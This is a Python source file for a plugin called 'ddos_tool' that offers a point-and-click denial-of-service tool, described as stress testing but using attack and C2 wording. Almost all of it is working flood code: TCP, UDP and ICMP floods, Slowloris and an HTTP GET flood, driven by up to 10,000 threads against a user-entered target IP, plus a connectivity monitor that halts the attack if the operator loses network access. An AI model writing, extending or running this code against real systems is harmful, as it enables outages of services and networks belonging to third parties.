# plugin.py
import socket
import threading
import time
import random
import subprocess
import sys
from plugin_sdk import Plugin, Field

# ==================== ATTACK IMPLEMENTATIONS ====================

class AttackMethods:
    """Built-in attack methods using only standard library"""
    
    @staticmethod
    def tcp_flood(target_ip, target_port, duration, stop_event):
        """TCP SYN flood - opens connections rapidly"""
        end_time = time.time() + duration
        count = 0
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                # Send garbage data
                payload = random._urandom(1024)
                sock.send(payload)
                count += 1
                sock.close()
            except:
                pass
        return count
    
    @staticmethod
    def udp_flood(target_ip, target_port, duration, stop_event):
        """UDP flood - sends UDP packets rapidly"""
        end_time = time.time() + duration
        count = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(65507)  # Max UDP payload
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock.sendto(payload, (target_ip, target_port))
                count += 1
            except:
                pass
        return count
    
    @staticmethod
    def icmp_flood(target_ip, duration, stop_event):
        """ICMP flood using raw socket (requires admin on some systems)"""
        end_time = time.time() + duration
        count = 0
        
        try:
            # Try to create raw socket for ICMP
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            # Fallback to standard ping subprocess spam
            while time.time() < end_time and not stop_event.is_set():
                try:
                    if sys.platform == "win32":
                        subprocess.Popen(["ping", "-n", "1", "-l", "65500", target_ip], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    else:
                        subprocess.Popen(["ping", "-c", "1", "-s", "65507", target_ip],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    count += 1
                except:
                    pass
            return count
        
        # Raw ICMP if we have permissions
        icmp_id = random.randint(0, 65535)
        icmp_seq = 0
        payload = random._urandom(56)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                # ICMP Echo Request header: type=8, code=0, checksum, id, seq
                header = bytes([8, 0, 0, 0, (icmp_id >> 8) & 0xff, icmp_id & 0xff,
                               (icmp_seq >> 8) & 0xff, icmp_seq & 0xff])
                packet = header + payload
                sock.sendto(packet, (target_ip, 0))
                icmp_seq = (icmp_seq + 1) % 65536
                count += 1
            except:
                pass
        return count
    
    @staticmethod
    def slowloris(target_ip, target_port, duration, stop_event):
        """Slowloris - partial HTTP requests that hold connections open"""
        end_time = time.time() + duration
        sockets = []
        count = 0
        
        while time.time() < end_time and not stop_event.is_set():
            # Maintain pool of slow connections
            for _ in range(50):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((target_ip, target_port))
                    # Send partial HTTP request
                    sock.send(b"GET / HTTP/1.1\r\n")
                    sock.send(f"Host: {target_ip}\r\n".encode())
                    sockets.append(sock)
                    count += 1
                except:
                    pass
            
            # Keep existing connections alive with headers
            for sock in sockets[:]:
                try:
                    sock.send(b"X-a: keepalive\r\n")
                except:
                    sockets.remove(sock)
            
            time.sleep(5)  # Send keepalive every 5 seconds
            
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        return count
    
    @staticmethod
    def http_get_flood(target_ip, target_port, duration, stop_event):
        """HTTP GET request flood"""
        end_time = time.time() + duration
        count = 0
        
        # Common user agents
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.0",
        ]
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                
                ua = random.choice(user_agents)
                request = f"GET /?{random.randint(0,99999)} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n"
                sock.send(request.encode())
                count += 1
                sock.close()
            except:
                pass
        return count

# ==================== CONNECTIVITY MONITOR ====================

class ConnectivityMonitor:
    """Monitors C2 connectivity via 1.1.1.1 ping every 3 seconds"""
    
    def __init__(self):
        self.connected = True
        self.stop_event = threading.Event()
        self.thread = None
    
    def _check_loop(self):
        """Ping 1.1.1.1 every 3 seconds"""
        while not self.stop_event.is_set():
            try:
                if sys.platform == "win32":
                    result = subprocess.run(
                        ["ping", "-n", "1", "-w", "3000", "1.1.1.1"],
                        capture_output=True,
                        timeout=5
                    )
                else:
                    result = subprocess.run(
                        ["ping", "-c", "1", "-W", "3", "1.1.1.1"],
                        capture_output=True,
                        timeout=5
                    )
                
                success = result.returncode == 0
                if not success and self.connected:
                    self.connected = False
                elif success and not self.connected:
                    self.connected = True
                    
            except Exception:
                self.connected = False
            
            time.sleep(3)
    
    def start(self):
        self.thread = threading.Thread(target=self._check_loop, daemon=True)
        self.thread.start()
    
    def stop(self):
        self.stop_event.set()
        if self.thread:
            self.thread.join(timeout=1)

# ==================== PLUGIN SETUP ====================

# UI Schema following ERRATIC plugin system
ui = [
    Field.section("Target Configuration"),
    Field.text("target_ip", label="Target IP", default="127.0.0.1", placeholder="e.g., 192.168.1.1"),
    Field.number("target_port", label="Target Port", default=80, min_val=1, max_val=65535),
    
    Field.section("Attack Settings"),
    Field.select("attack_type", label="Attack Type", options=[
        {"label": "TCP Flood", "value": "tcp_flood"},
        {"label": "UDP Flood", "value": "udp_flood"},
        {"label": "ICMP Flood", "value": "icmp_flood"},
        {"label": "Slowloris", "value": "slowloris"},
        {"label": "HTTP GET Flood", "value": "http_get"},
        {"label": "All Methods (Cycle)", "value": "all"}
    ], default="tcp_flood"),
    Field.number("threads", label="Threads", default=100, min_val=1, max_val=10000),
    Field.number("duration", label="Duration (seconds)", default=60, min_val=1, max_val=3600),
    
    Field.section("Safety"),
    Field.toggle("enable_c2_check", label="Enable C2 Connectivity Check (1.1.1.1)", default=True),
    
    Field.section("Control"),
    Field.button("start_attack", label="▶ Start Attack"),
    Field.button("stop_attack", label="⏹ Stop Attack"),
    
    Field.section("Status"),
    Field.output("status", label="Attack Status", height="100px"),
    Field.output("stats", label="Statistics", height="150px"),
    Field.output("log", label="Event Log", height="200px"),
]

plugin = Plugin("ddos_tool", "1.0", "Network stress testing tool with C2 safety", ui, author="erratic")

# Global state
attack_state = {
    "running": False,
    "stop_event": threading.Event(),
    "threads": [],
    "monitor": None,
    "stats": {"packets_sent": 0, "start_time": None, "method": ""}
}

# ==================== COMMAND HANDLERS ====================

@plugin.on_command("start_attack")
def start_attack(args):
    global attack_state
    
    if attack_state["running"]:
        plugin.set_output("log", "[!] Attack already running")
        return {"status": "already_running"}
    
    # Get parameters
    target_ip = plugin.get_field("target_ip")
    target_port = plugin.get_field("target_port")
    attack_type = plugin.get_field("attack_type")
    thread_count = plugin.get_field("threads")
    duration = plugin.get_field("duration")
    enable_c2 = plugin.get_field("enable_c2_check")
    
    # Validate
    try:
        socket.inet_aton(target_ip)
    except socket.error:
        plugin.set_output("log", f"[!] Invalid IP address: {target_ip}")
        return {"status": "invalid_ip"}
    
    # Reset state
    attack_state["running"] = True
    attack_state["stop_event"].clear()
    attack_state["threads"] = []
    attack_state["stats"] = {"packets_sent": 0, "start_time": time.time(), "method": attack_type}
    
    # Start connectivity monitor if enabled
    if enable_c2:
        attack_state["monitor"] = ConnectivityMonitor()
        attack_state["monitor"].start()
        plugin.set_output("log", "[*] C2 connectivity monitor started (1.1.1.1 every 3s)")
    
    plugin.set_output("status", f"ATTACKING {target_ip}:{target_port} via {attack_type}")
    plugin.log(f"Starting {attack_type} attack on {target_ip}:{target_port} with {thread_count} threads")
    
    # Launch attack threads
    def attack_worker(method_func, *method_args):
        """Worker that checks connectivity and runs attack"""
        while not attack_state["stop_event"].is_set():
            # Check C2 connectivity if enabled
            if enable_c2 and attack_state["monitor"] and not attack_state["monitor"].connected:
                plugin.set_output("log", "[!] C2 connectivity LOST - stopping attack to prevent isolation")
                plugin.set_output("status", "STOPPED - C2 connectivity lost")
                attack_state["stop_event"].set()
                break
            
            # Run attack method
            try:
                result = method_func(*method_args, attack_state["stop_event"])
                if result:
                    attack_state["stats"]["packets_sent"] += result
            except Exception as e:
                plugin.log(f"Thread error: {e}")
    
    # Map attack types to methods
    method_map = {
        "tcp_flood": (AttackMethods.tcp_flood, (target_ip, target_port, duration)),
        "udp_flood": (AttackMethods.udp_flood, (target_ip, target_port, duration)),
        "icmp_flood": (AttackMethods.icmp_flood, (target_ip, duration)),
        "slowloris": (AttackMethods.slowloris, (target_ip, target_port, duration)),
        "http_get": (AttackMethods.http_get_flood, (target_ip, target_port, duration)),
    }
    
    # Spawn threads
    for i in range(thread_count):
        if attack_type == "all":
            # Cycle through all methods
            methods = list(method_map.keys())
            method_name = methods[i % len(methods)]
        else:
            method_name = attack_type
        
        if method_name in method_map:
            method_func, method_args = method_map[method_name]
            t = threading.Thread(target=attack_worker, args=(method_func, *method_args), daemon=True)
            t.start()
            attack_state["threads"].append(t)
    
    # Stats reporter thread
    def stats_reporter():
        while attack_state["running"] and not attack_state["stop_event"].is_set():
            time.sleep(5)
            elapsed = time.time() - attack_state["stats"]["start_time"]
            pps = attack_state["stats"]["packets_sent"] / elapsed if elapsed > 0 else 0
            
            stats_text = (
                f"Method: {attack_type}\n"
                f"Duration: {elapsed:.1f}s / {duration}s\n"
                f"Threads: {thread_count}\n"
                f"Packets Sent: {attack_state['stats']['packets_sent']}\n"
                f"Rate: {pps:.1f} pkt/sec\n"
                f"C2 Status: {'CONNECTED' if (not enable_c2 or attack_state['monitor'].connected) else 'DISCONNECTED'}"
            )
            plugin.set_output("stats", stats_text)
            
            # Auto-stop after duration
            if elapsed >= duration:
                plugin.set_output("log", "[*] Duration reached - stopping attack")
                stop_attack({"auto": True})
                break
    
    stats_thread = threading.Thread(target=stats_reporter, daemon=True)
    stats_thread.start()
    attack_state["threads"].append(stats_thread)
    
    return {"status": "started", "target": f"{target_ip}:{target_port}", "method": attack_type}

@plugin.on_command("stop_attack")
def stop_attack(args):
    global attack_state
    
    if not attack_state["running"]:
        plugin.set_output("log", "[!] No attack running")
        return {"status": "not_running"}
    
    plugin.set_output("status", "STOPPING...")
    plugin.log("Stopping attack...")
    
    # Signal stop
    attack_state["stop_event"].set()
    attack_state["running"] = False
    
    # Stop monitor
    if attack_state["monitor"]:
        attack_state["monitor"].stop()
    
    # Wait for threads
    for t in attack_state["threads"]:
        t.join(timeout=2)
    
    attack_state["threads"] = []
    
    elapsed = time.time() - attack_state["stats"]["start_time"]
    final_stats = (
        f"Attack Stopped\n"
        f"Total Packets: {attack_state['stats']['packets_sent']}\n"
        f"Duration: {elapsed:.1f}s"
    )
    
    plugin.set_output("status", "STOPPED")
    plugin.set_output("stats", final_stats)
    plugin.set_output("log", "[*] Attack stopped successfully")
    
    return {"status": "stopped", "packets": attack_state["stats"]["packets_sent"]}

# Start event loop
plugin.run()
